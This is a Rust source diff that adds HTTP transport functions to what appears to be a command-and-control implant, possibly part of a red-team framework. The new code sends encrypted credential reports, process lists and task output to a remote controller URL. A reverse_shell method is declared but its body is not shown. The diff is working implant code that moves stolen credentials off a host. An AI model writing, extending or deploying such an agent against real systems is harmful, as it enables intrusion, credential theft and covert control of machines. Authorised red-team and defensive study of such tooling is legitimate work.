@@ -98,7 +98,8 @@ impl Transport for HTTP {
             .context("Failed to read response body")?;
 
         // Unmarshal: Decrypt and decode the response using the codec
-        let response_msg = unmarshal_with_codec::<ClaimTasksRequest, ClaimTasksResponse>(&body_bytes)?;
+        let response_msg =
+            unmarshal_with_codec::<ClaimTasksRequest, ClaimTasksResponse>(&body_bytes)?;
 
         Ok(response_msg)
     }
@@ -115,7 +116,43 @@ impl Transport for HTTP {
         &mut self,
         request: ReportCredentialRequest,
     ) -> Result<ReportCredentialResponse> {
-        unimplemented!("todo")
+        // Marshal: Encode and encrypt the request using the codec
+        let request_bytes =
+            marshal_with_codec::<ReportCredentialRequest, ReportCredentialResponse>(request)?;
+
+        // Build the URL
+        let url = format!("{}{}", self.base_url, REPORT_CREDENTIAL_PATH);
+        let uri: hyper::Uri = url.parse().context("Failed to parse URL")?;
+
+        // Build the HTTP request
+        let req = hyper::Request::builder()
+            .method(hyper::Method::POST)
+            .uri(uri)
+            .header("Content-Type", "application/grpc")
+            .body(hyper::Body::from(request_bytes))
+            .context("Failed to build HTTP request")?;
+
+        // Send the request
+        let response = self
+            .client
+            .request(req)
+            .await
+            .context("Failed to send HTTP request")?;
+
+        if response.status() != StatusCode::OK {
+            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
+        }
+
+        // Read the response body
+        let body_bytes = hyper::body::to_bytes(response.into_body())
+            .await
+            .context("Failed to read response body")?;
+
+        // Unmarshal: Decrypt and decode the response using the codec
+        let response_msg =
+            unmarshal_with_codec::<ReportCredentialRequest, ReportCredentialResponse>(&body_bytes)?;
+
+        Ok(response_msg)
     }
 
     async fn report_file(
@@ -129,14 +166,86 @@ impl Transport for HTTP {
         &mut self,
         request: ReportProcessListRequest,
     ) -> Result<ReportProcessListResponse> {
-        unimplemented!("todo")
+        // Marshal: Encode and encrypt the request using the codec
+        let request_bytes =
+            marshal_with_codec::<ReportProcessListRequest, ReportProcessListResponse>(request)?;
+
+        // Build the URL
+        let url = format!("{}{}", self.base_url, REPORT_PROCESS_LIST_PATH);
+        let uri: hyper::Uri = url.parse().context("Failed to parse URL")?;
+
+        // Build the HTTP request
+        let req = hyper::Request::builder()
+            .method(hyper::Method::POST)
+            .uri(uri)
+            .header("Content-Type", "application/grpc")
+            .body(hyper::Body::from(request_bytes))
+            .context("Failed to build HTTP request")?;
+
+        // Send the request
+        let response = self
+            .client
+            .request(req)
+            .await
+            .context("Failed to send HTTP request")?;
+
+        if response.status() != StatusCode::OK {
+            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
+        }
+
+        // Read the response body
+        let body_bytes = hyper::body::to_bytes(response.into_body())
+            .await
+            .context("Failed to read response body")?;
+
+        // Unmarshal: Decrypt and decode the response using the codec
+        let response_msg =
+            unmarshal_with_codec::<ReportProcessListRequest, ReportProcessListResponse>(&body_bytes)?;
+
+        Ok(response_msg)
     }
 
     async fn report_task_output(
         &mut self,
         request: ReportTaskOutputRequest,
     ) -> Result<ReportTaskOutputResponse> {
-        unimplemented!("todo")
+        // Marshal: Encode and encrypt the request using the codec
+        let request_bytes =
+            marshal_with_codec::<ReportTaskOutputRequest, ReportTaskOutputResponse>(request)?;
+
+        // Build the URL
+        let url = format!("{}{}", self.base_url, REPORT_TASK_OUTPUT_PATH);
+        let uri: hyper::Uri = url.parse().context("Failed to parse URL")?;
+
+        // Build the HTTP request
+        let req = hyper::Request::builder()
+            .method(hyper::Method::POST)
+            .uri(uri)
+            .header("Content-Type", "application/grpc")
+            .body(hyper::Body::from(request_bytes))
+            .context("Failed to build HTTP request")?;
+
+        // Send the request
+        let response = self
+            .client
+            .request(req)
+            .await
+            .context("Failed to send HTTP request")?;
+
+        if response.status() != StatusCode::OK {
+            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
+        }
+
+        // Read the response body
+        let body_bytes = hyper::body::to_bytes(response.into_body())
+            .await
+            .context("Failed to read response body")?;
+
+        // Unmarshal: Decrypt and decode the response using the codec
+        let response_msg =
+            unmarshal_with_codec::<ReportTaskOutputRequest, ReportTaskOutputResponse>(&body_bytes)?;
+
+        Ok(response_msg)
     }
 
     async fn reverse_shell(
